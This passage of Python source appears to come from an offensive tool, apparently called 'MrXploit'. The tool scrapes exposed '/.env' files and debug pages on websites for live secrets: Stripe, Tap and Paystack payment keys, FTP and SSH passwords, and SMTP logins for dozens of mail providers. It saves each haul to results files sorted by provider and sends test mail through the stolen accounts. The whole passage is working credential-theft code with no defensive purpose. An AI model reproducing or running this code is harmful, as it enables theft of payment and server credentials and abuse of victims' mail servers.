						plivo_auth = ''
					try:
						plivo_secret = reg('\nSTRIPE_SECRET=(.*?)\n', text)[0]
					except:
						plivo_secret = ''
				elif '<td>STRIPE_KEY</td>' in text:
					method = 'debug'
					try:
						plivo_auth = reg('<td>STRIPE_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						plivo_auth = ''
					try:
						plivo_secret = reg('<td>STRIPE_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						plivo_secret = ''
				build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nSK Key: '+str(plivo_auth)+'\nSK Secret : '+str(plivo_secret)
				remover = str(build).replace('\r', '')
				print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}PLIVO {fc}[{yl}{plivo_auth}{res}:{fc}{plivo_secret}{fc}]")
				save = open('Results/skCrac.txt', 'a')
				save.write(remover+'\n')
				save.close()
				return True
			elif "STRIPE_KEY_CHINA_FINANCE" in text:
				if "STRIPE_KEY_CHINA_FINANCE=" in text:
					method = '/.env'
					try:
						plivo_auth = reg('\nSTRIPE_KEY_CHINA_FINANCE=(.*?)\n', text)[0]
					except:
						plivo_auth = ''
					try:
						plivo_secret = reg('\nSTRIPE_SECRET_CHINA_FINANCE=(.*?)\n', text)[0]
					except:
						plivo_secret = ''
				elif '<td>STRIPE_KEY_CHINA_FINANCE</td>' in text:
					method = 'debug'
					try:
						plivo_auth = reg('<td>STRIPE_KEY_CHINA_FINANCE<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						plivo_auth = ''
					try:
						plivo_secret = reg('<td>STRIPE_SECRET_CHINA_FINANCE<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						plivo_secret = ''
				build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nSK Key: '+str(plivo_auth)+'\nSK Secret : '+str(plivo_secret)
				remover = str(build).replace('\r', '')
				print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}PLIVO {fc}[{yl}{plivo_auth}{res}:{fc}{plivo_secret}{fc}]")
				save = open('Results/skCrac.txt', 'a')
				save.write(remover+'\n')
				save.close()
				return True
			elif "STRIPE_KEY_CINEMACITY" in text:
				if "STRIPE_KEY_CINEMACITY=" in text:
					method = '/.env'
					try:
						plivo_auth = reg('\nSTRIPE_KEY_CINEMACITY=(.*?)\n', text)[0]
					except:
						plivo_auth = ''
					try:
						plivo_secret = reg('\nSTRIPE_SECRET_CINEMACITY=(.*?)\n', text)[0]
					except:
						plivo_secret = ''
				elif '<td>STRIPE_KEY_CINEMACITY</td>' in text:
					method = 'debug'
					try:
						plivo_auth = reg('<td>STRIPE_KEY_CINEMACITY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						plivo_auth = ''
					try:
						plivo_secret = reg('<td>STRIPE_SECRET_CINEMACITY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						plivo_secret = ''
				build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nSK Key: '+str(plivo_auth)+'\nSK Secret : '+str(plivo_secret)
				remover = str(build).replace('\r', '')
				print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}PLIVO {fc}[{yl}{plivo_auth}{res}:{fc}{plivo_secret}{fc}]")
				save = open('Results/skCrac.txt', 'a')
				save.write(remover+'\n')
				save.close()
				return True
			elif "TAP_PUBLIC_KEY" in text:
				if "TAP_PUBLIC_KEY=" in text:
					method = '/.env'
					try:
						plivo_auth = reg('\nTAP_PUBLIC_KEY=(.*?)\n', text)[0]
					except:
						plivo_auth = ''
					try:
						plivo_secret = reg('\nTAP_SECRET_KEY=(.*?)\n', text)[0]
					except:
						plivo_secret = ''
				elif '<td>TAP_PUBLIC_KEY</td>' in text:
					method = 'debug'
					try:
						plivo_auth = reg('<td>TAP_PUBLIC_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						plivo_auth = ''
					try:
						plivo_secret = reg('<td>TAP_SECRET_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						plivo_secret = ''
				build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nSK Key: '+str(plivo_auth)+'\nSK Secret : '+str(plivo_secret)
				remover = str(build).replace('\r', '')
				print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}PLIVO {fc}[{yl}{plivo_auth}{res}:{fc}{plivo_secret}{fc}]")
				save = open('Results/skCrac.txt', 'a')
				save.write(remover+'\n')
				save.close()
				return True
			elif "STRIPE_LIVE_KEY" in text:
				if "STRIPE_LIVE_KEY=" in text:
					method = '/.env'
					try:
						plivo_auth = reg('\nSTRIPE_LIVE_KEY=(.*?)\n', text)[0]
					except:
						plivo_auth = ''
					try:
						plivo_secret = reg('\nSTRIPE_LIVE_SECRET=(.*?)\n', text)[0]
					except:
						plivo_secret = ''
				elif '<td>STRIPE_LIVE_KEY</td>' in text:
					method = 'debug'
					try:
						plivo_auth = reg('<td>STRIPE_LIVE_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						plivo_auth = ''
					try:
						plivo_secret = reg('<td>STRIPE_LIVE_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						plivo_secret = ''
				build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nSK Key: '+str(plivo_auth)+'\nSK Secret : '+str(plivo_secret)
				remover = str(build).replace('\r', '')
				print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}PLIVO {fc}[{yl}{plivo_auth}{res}:{fc}{plivo_secret}{fc}]")
				save = open('Results/skCrac.txt', 'a')
				save.write(remover+'\n')
				save.close()
				return True
			elif "STRIPE_KEY_LIVE" in text:
				if "STRIPE_KEY_LIVE=" in text:
					method = '/.env'
					try:
						plivo_auth = reg('\nSTRIPE_KEY_LIVE=(.*?)\n', text)[0]
					except:
						plivo_auth = ''
					try:
						plivo_secret = reg('\nSTRIPE_SECRET_LIVE=(.*?)\n', text)[0]
					except:
						plivo_secret = ''
				elif '<td>STRIPE_KEY_LIVE</td>' in text:
					method = 'debug'
					try:
						plivo_auth = reg('<td>STRIPE_KEY_LIVE<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						plivo_auth = ''
					try:
						plivo_secret = reg('<td>STRIPE_SECRET_LIVE<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						plivo_secret = ''
				build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nSK Key: '+str(plivo_auth)+'\nSK Secret : '+str(plivo_secret)
				remover = str(build).replace('\r', '')
				print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}PLIVO {fc}[{yl}{plivo_auth}{res}:{fc}{plivo_secret}{fc}]")
				save = open('Results/skCrac.txt', 'a')
				save.write(remover+'\n')
				save.close()
				return True
			elif "PAYSTACK_PUBLIC_KEY" in text:
				if "PAYSTACK_PUBLIC_KEY=" in text:
					method = '/.env'
					try:
						plivo_auth = reg('\nPAYSTACK_PUBLIC_KEY=(.*?)\n', text)[0]
					except:
						plivo_auth = ''
					try:
						plivo_secret = reg('\nPAYSTACK_SECRET_KEY=(.*?)\n', text)[0]
					except:
						plivo_secret = ''
				elif '<td>PAYSTACK_PUBLIC_KEY</td>' in text:
					method = 'debug'
					try:
						plivo_auth = reg('<td>PAYSTACK_PUBLIC_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						plivo_auth = ''
					try:
						plivo_secret = reg('<td>PAYSTACK_SECRET_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						plivo_secret = ''
				build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nSK Key: '+str(plivo_auth)+'\nSK Secret : '+str(plivo_secret)
				remover = str(build).replace('\r', '')
				print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}PLIVO {fc}[{yl}{plivo_auth}{res}:{fc}{plivo_secret}{fc}]")
				save = open('Results/skCrac.txt', 'a')
				save.write(remover+'\n')
				save.close()
				return True
			elif "FTP_HOST" in text:
				if "FTP_HOST=" in text:
					method = '/.env'
					try:
						plivo_auth = reg('\nFTP_USERNAME=(.*?)\n', text)[0]
					except:
						plivo_auth = ''
					try:
						plivo_secret = reg('\nFTP_PASSWORD=(.*?)\n', text)[0]
					except:
						plivo_secret = ''
				elif '<td>FTP_HOST</td>' in text:
					method = 'debug'
					try:
						plivo_auth = reg('<td>FTP_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						plivo_auth = ''
					try:
						plivo_secret = reg('<td>FTP_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						plivo_secret = ''
				build = 'FTP: '+str(url)+'|'+str(plivo_auth)+'|'+str(plivo_secret)
				remover = str(build).replace('\r', '')
				print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}PLIVO {fc}[{yl}{plivo_auth}{res}:{fc}{plivo_secret}{fc}]")
				save = open('Results/FTP_env.txt', 'a')
				save.write(remover+'\n')
				save.close()
				return True
			elif "SSH_USERNAME" in text:
				if "SSH_USERNAME=" in text:
					method = '/.env'
					try:
						ssh_username = reg('\nSSH_USERNAME=(.*?)\n', text)[0]
					except:
						ssh_username = ''
					try:
						ssh_pass = reg('\nSSH_PASSWORD=(.*?)\n', text)[0]
					except:
						ssh_pass = ''
					try:
						ssh_ip = reg('\nSSH_IP=(.*?)\n', text)[0]
					except:
						ssh_ip = ''
				elif '<td>FTP_HOST</td>' in text:
					method = 'debug'
					try:
						ssh_username = reg('<td>SSH_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						ssh_username = ''
					try:
						ssh_pass = reg('<td>SSH_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						ssh_pass = ''
					try:
						ssh_ip = reg('<td>SSH_IP<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					except:
						ssh_ip = ''
				build = 'SSH: '+str(ssh_ip)+'|'+str(ssh_username)+'|'+str(ssh_pass)
				remover = str(build).replace('\r', '')
				print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}PLIVO {fc}[{yl}{plivo_auth}{res}:{fc}{plivo_secret}{fc}]")
				save = open('Results/SSH_env.txt', 'a')
				save.write(remover+'\n')
				save.close()
				return True
			else:
				return False
		except:
			return False
	def get_smtp(self, text, url):
		try:
			if "MAIL_HOST" in text:
				if "MAIL_HOST=" in text:
					method = '/.env'
					mailhost = reg("\nMAIL_HOST=(.*?)\n", text)[0]
					mailport = reg("\nMAIL_PORT=(.*?)\n", text)[0]
					mailuser = reg("\nMAIL_USERNAME=(.*?)\n", text)[0]
					mailpass = reg("\nMAIL_PASSWORD=(.*?)\n", text)[0]
					try:
						mailfrom = reg("MAIL_FROM_ADDRESS=(.*?)\n", text)[0]
					except:
						mailfrom = 'info@myMrXploit.in'
					try:
						fromname = reg("MAIL_FROM_NAME=(.*?)\n", text)[0]
					except:
						fromname = 'MrXploit'
				elif "<td>MAIL_HOST</td>" in text:
					method = 'debug'
					mailhost = reg('<td>MAIL_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					mailport = reg('<td>MAIL_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					mailuser = reg('<td>MAIL_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					mailpass = reg('<td>MAIL_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
					try:
						mailfrom = reg("<td>MAIL_FROM_ADDRESS<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						mailfrom = 'info@myMrXploit.in'
					try:
						fromname = reg("<td>MAIL_FROM_NAME<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						fromname = 'MrXploit'
				if mailuser == "null" or mailpass == "null" or mailuser == "" or mailpass == "":
					return False
				else:
					satu = cleanit(mailhost + '|' + mailport + '|' + mailuser + '|' + mailpass)
					if '.amazonaws.com' in mailhost:
						getcountry = reg('email-smtp.(.*?).amazonaws.com', mailhost)[0]
						build = str(mailuser)+':'+str(mailpass)+':'+str(mailhost)
						remover = str(build).replace('\r', '')
						save = open('Results/'+getcountry[:-2]+'.txt', 'a')
						save.write(remover+'\n')
						save.close()
						remover = str(build).replace('\r', '')
						save2 = open('Results/SMTP(AWS).txt', 'a')
						save2.write(remover+'\n')
						save2.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)
					elif 'sendgrid' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)+':ssl::::0'
						remover = str(build).replace('\r', '')
						print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}SENDGRID {fc}[{yl}{mailpass}{res}{fc}]")
						save = open('Results/SMTP(SENDGRID).txt', 'a')
						save.write(remover+'\n')
						save.close()
						ceker_sendgrid(url, mailpass)
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)
						save3.close()
						ceker_sendgrid(url, mailpass)
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)
					elif 'office365' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(OFFICE365).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif '1and1' in mailhost or '1und1' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(1AND1).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif 'zoho' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(ZOHO).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif 'mandrillapp' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)+':ssl::::0'
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(MANDRILL).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif 'mailgun' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)+':ssl::::0'
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(MAILGUN).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif '.it' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(ITALY).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif 'emailsrvr' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(RACKSPACE).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif 'MAIL_HOST' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(MAILSSSSS).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif '.yandex' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(YANDEX).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif '.OVH' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(OVH).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif '.ionos' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(IONOS).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif 'zimbra' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(ZIMBRA).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif 'kasserver.com' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(KASSASERVER).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif 'smtp-relay.gmail' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(RANDOM).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif 'sparkpostmail.com' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(SPARKPOST).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif '.jp' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(JAPAN).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif 'gmoserver' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(GMO).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif 'mailjet' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(MAILJET).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif 'gmail.com' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(GMAIL).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif 'googlemail' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(GOOGLEMAIL).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif 'aruba.it' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(ARUBA).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif 'hetzner' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(HETZNER).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif '163' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(163).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif '263' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(263).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif 'Aliyun' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(ALIYUN).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif 'att.net' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(ATTNET).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif 'chinaemail' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(CHINAEMAIL).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif 'comcast' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(COMCAST).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif 'cox.net' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(COX).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif 'earthlink' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(EARTH).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif 'global-mail' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(GLOBAL).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif 'gmx' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(GMX).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif 'godaddy' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(GODADDY).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif 'hinet' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(HINET).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif 'hotmail' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(HOTMAIL).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif 'mail.ru' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(MAILRU).txt', 'a')
						save.write(remover+'\n')
						save.close()
						mail(url, mailhost, mailport, mailuser, mailpass, mailfrom)

					elif 'mimecast' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(RANDOM).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif 'mweb' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(MWEB).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif 'netease' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(NETEASE).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif 'NetworkSolutions' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(NETWORK).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif 'outlook' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(HOTMAIL).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif 'qq' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(QQ).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif 'sina-email' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(SINA).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif 'strato' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(STRATO).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif 'synaq' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(SYNAQ).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif 'yihigher' in mailhost:
						build = str(mailhost)+':'+str(mailport)+':'+str(mailuser)+':'+str(mailpass)+':'+str(mailfrom)
						remover = str(build).replace('\r', '')
						save = open('Results/SMTP(YIGHER).txt', 'a')
						save.write(remover+'\n')
						save.close()
						check = sendme()
						check.mail(mailhost,str(mailport),mailuser,mailpass,mailfrom)

					elif 'zmail' in mailhost:
